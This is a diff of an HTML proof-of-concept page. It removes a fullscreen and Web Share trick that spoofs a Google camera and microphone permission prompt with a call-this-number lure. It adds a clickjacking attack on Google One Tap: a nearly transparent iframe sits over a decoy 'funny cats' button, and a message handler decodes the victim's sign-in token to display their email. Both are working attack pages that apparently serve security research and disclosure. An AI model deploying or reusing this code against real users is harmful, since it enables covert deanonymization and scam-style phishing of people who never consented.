@@ -1,37 +1,46 @@
 
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Fullscreen and Share</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Clickjacking on Google One Tap</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
 </head>
 <body>
+    <div>
+        <h1>Clickjacking on Google One Tap</h1>
+        <p>Last verified on: 10.04.2024</p>
+        <p>Last verified on: 10.04.2024</p>
 
-<button id="shareButton">Go Fullscreen & Share</button>
+        <iframe src="https://pocs.work/pocs/2024/google-one-tap-clickjacking/gis.html" style="border: 1px solid black; opacity: 5%;" width="500px" height="300px"></iframe>
+        <button class="btn btn-primary" style="position: absolute; top: 240px; left: 90px; z-index: -9999;">click me to see funny cats 🐱</button>
 
-<script>
-document.getElementById("shareButton").addEventListener("click", async () => {
-  // Go full screen
-  if (document.documentElement.requestFullscreen) {
-    await document.documentElement.requestFullscreen();
-  } else if (document.documentElement.webkitRequestFullscreen) { // Safari
-    await document.documentElement.webkitRequestFullscreen();
-  }
+        <p>Result: <span id="res"></span></p>
+    </div>
 
-  // Wait 1 second
-  setTimeout(() => {
-    if (navigator.share) {
-      navigator.share({
-        title: '⚠ Camera and Microphone ⚠\nhttps://www.google.com wants to',
-        text: 'Call 123-456-7890'
-      }).catch((error) => {
-        console.error("Sharing failed:", error);
-      });
-    } else {
-      alert("Web Share API is not supported in your browser.");
-    }
-  }, 222);
-});
-</script>
+    <script>
+        function parse(jwt) {
+            const base64Url = jwt.split('.')[1];
+            const base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
+            const jsonPayload = decodeURIComponent(atob(base64).split('').map(function(c) {
+                return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
+            }).join(''));
+            const payload = JSON.parse(jsonPayload);
+            return payload;
+        }
 
+        window.onmessage = (e) => {
+            const payload = parse(e.data.credential)
+            const email = document.createElement("div")
+            email.className = "alert alert-success"
+            email.innerText = `You have been deanonymized as ${payload.email}`
+            res.appendChild(email)
+            const jwt = document.createElement("div")
+            jwt.className = "alert alert-success"
+            jwt.innerText = `JWT Payload: ${JSON.stringify(payload)}`
+            res.appendChild(jwt)
+        }
+    </script>
 </body>
 </html>
